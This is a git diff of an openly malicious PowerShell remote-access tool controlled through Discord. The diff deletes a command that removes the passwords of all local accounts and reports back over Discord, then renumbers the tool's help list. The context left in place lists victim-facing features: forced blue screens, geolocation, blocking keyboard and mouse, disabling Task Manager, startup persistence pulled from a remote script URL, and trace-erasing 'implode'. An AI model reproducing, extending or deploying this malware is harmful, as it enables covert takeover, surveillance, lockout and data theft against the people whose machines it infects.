@@ -751,19 +751,7 @@ Send-Discord -Attachment $outputPath
     [Program]::Bluescreen()}
     Bluescreen
     }
-}        "delpasswords"{
-    $passDelUsers = $null
-    $userAccounts = Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"
-    foreach ($user in $userAccounts) {
-    try {
-    net user $user.Name "" | Out-Null
-    $passDelUsers = $passDelUsers + "Password removed for $($user.Name)`n"
-    } catch {
-    $passDelUsers = $passDelUsers + "Failed to remove password for $($user.Name): $_`n"}}
-    Write-Host $passDelUsers
-    Send-Discord $passDelUsers
-}
-        "geolocate"{
+}        "geolocate"{
             try {
                 Add-Type -AssemblyName System.Device # Required to access System.Device.Location namespace
                 $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher 
@@ -1047,36 +1035,33 @@ E          X          A          M          P          L          E          S
 39. !bluescreen        // Triggers a blue screen on the victim's computer
     Example: !bluescreen
 
-40. !delpasswords      // Deletes all passwords for all accounts on the current computer
-    Example: !delpasswords
-
-41. !geolocate         // Retrieves the victim's geolocation data
+40. !geolocate         // Retrieves the victim's geolocation data
     Example: !geolocate
 
-42. !block             // Blocks the victim's keyboard and mouse (requires admin)
+41. !block             // Blocks the victim's keyboard and mouse (requires admin)
     Example: !block
 
-43. !unblock           // Unblocks the victim's keyboard and mouse (requires admin)
+42. !unblock           // Unblocks the victim's keyboard and mouse (requires admin)
     Example: !unblock
 
-44. !disabletaskmgr    // Disables Task Manager (requires admin)
+43. !disabletaskmgr    // Disables Task Manager (requires admin)
     Example: !disabletaskmgr
 
-45. !enabletaskmgr     // Enables Task Manager (requires admin)
+44. !enabletaskmgr     // Enables Task Manager (requires admin)
     Example: !enabletaskmgr
 
-46. !admin             //attempts to replace session with admin (shows prompt)
+45. !admin             //attempts to replace session with admin (shows prompt)
     Example: !admin
 
-47. !startup           // Enables persistence for this script
+46. !startup           // Enables persistence for this script
         will add a ps1 script to startup
-        on line 15, set the var StartupPsOnlineFileLocation to the full url of your ps1 file
+        on line 9, set the var StartupPsOnlineFileLocation to the full url of your ps1 file
     Example: !startup
 
-48. !implode           // Triggers a system implosion (Leaves no trace)
+47. !implode           // Triggers a system implosion (Leaves no trace)
     Example: !implode
 
-49. !help              // Displays information about available commands
+48. !help              // Displays information about available commands
     Example: !help
 "@
     Set-Content -Path "$env:TEMP\help.txt" -Value $content
